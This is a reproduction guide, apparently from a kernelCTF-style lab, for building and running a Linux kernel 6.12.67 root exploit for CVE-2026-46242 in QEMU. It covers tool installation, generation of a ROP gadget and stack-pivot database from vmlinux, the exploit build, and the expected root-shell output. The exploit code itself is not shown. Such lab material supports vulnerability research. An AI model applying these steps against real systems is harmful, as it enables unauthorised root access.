# Reproduction Guide

This guide walks through reproducing the exact environment, dependencies, database regeneration, and execution of the Tier 1 exploit on a fresh Fedora Linux installation.

## Prerequisites
Assume a fresh installation of Fedora Linux 44. The following dependencies must be installed:

```bash
# System packages
sudo dnf install -y gcc g++ cmake git python3 python3-pip make wget unzip curl

# Note: bpftool requires sudo access on Fedora to install via dnf:
sudo dnf install -y bpftool

# Pahole/dwarves (already tested to be present or can be installed)
sudo dnf install -y dwarves
```

## Install Python Dependencies

```bash
pip install --user angr angrop keystone-engine pyelftools capstone unicorn
```

## Install rp++ (Gadget Finder)

```bash
curl -LO https://github.com/0vercl0k/rp/releases/download/v2.1.5/rp-lin-gcc.zip
unzip rp-lin-gcc.zip -d ~/.local/bin/
mv ~/.local/bin/rp-lin ~/.local/bin/rp++
chmod +x ~/.local/bin/rp++
```

## Fix Angrop Pickling Error (Python 3.12+)

Due to a multiprocess pickling error in `angrop`, you must manually patch `rop_utils.py`:
Open `~/.local/lib/python3.14/site-packages/angrop/rop_utils.py` and move `class SpecialMem` outside of the `make_initial_state` function to the module level.

## Database Regeneration

1. Navigate to the database generator directory:
```bash
cd bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/kernel-research
```

2. Create the target profile directory and copy the locally compiled kernel images:
```bash
mkdir -p image_db/releases/kernelctf/lts-6.12.67
cp ../../../../../../linux-6.12.67/vmlinux image_db/releases/kernelctf/lts-6.12.67/
cp ../../../../../../linux-6.12.67/arch/x86/boot/bzImage image_db/releases/kernelctf/lts-6.12.67/vmlinuz
echo "Linux version 6.12.67 (legion@fedora)" > image_db/releases/kernelctf/lts-6.12.67/version.txt
```

3. Execute the generator pipeline (run from `image_db/releases/kernelctf/lts-6.12.67`):
```bash
cd image_db/releases/kernelctf/lts-6.12.67
nm vmlinux > symbols.txt
pahole --btf_encode_detached btf vmlinux
bpftool btf dump -j file btf > btf.json
python3 ../../../extract_structures.py > structs.json
python3 ../../../kernel_pages.py vmlinux > kernel_pages.txt
python3 ../../../../rop_generator/angrop_rop_generator.py --output json --json-indent 4 vmlinux vmlinuz > rop_actions.json
python3 ../../../../rop_generator/pivot_finder.py --output json --json-indent 4 vmlinux vmlinuz > stack_pivots.json
```

4. Build the final database:
```bash
cd ../../../../kxdb_tool
./kxdb_tool.py --image-db-path ../image_db -o ../target_db.kxdb
```

## Exploit Execution

1. Navigate to the exploit build directory:
```bash
cd bad-epoll-lab/exploit/tier1-linux-vm/security-research/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67
```

2. Rebuild the exploit and package it into the VM rootfs:
```bash
make
rm -f ../../../../../../rootfs_debug/bin/exploit
cp exploit ../../../../../../rootfs_debug/bin/exploit
cd ../../../../../../rootfs_debug
find . -print0 | cpio --null -ov --format=newc > ../initramfs_exploit_debug.cpio
cd ..
```

3. Launch QEMU:
```bash
./start_qemu.sh
```

4. Verify Output (in `qemu_output.log`):
Expected success output:
```
Win! UID: 0, GID: 0, EUID: 0
uid=0(root) gid=0(root)
Linux (none) 6.12.67 #1 SMP PREEMPT_DYNAMIC Sun Jul 12 18:29:43 EDT 2026 x86_64 x86_64 x86_64 GNU/Linux
ROOT_SHELL_SUCCESS
```
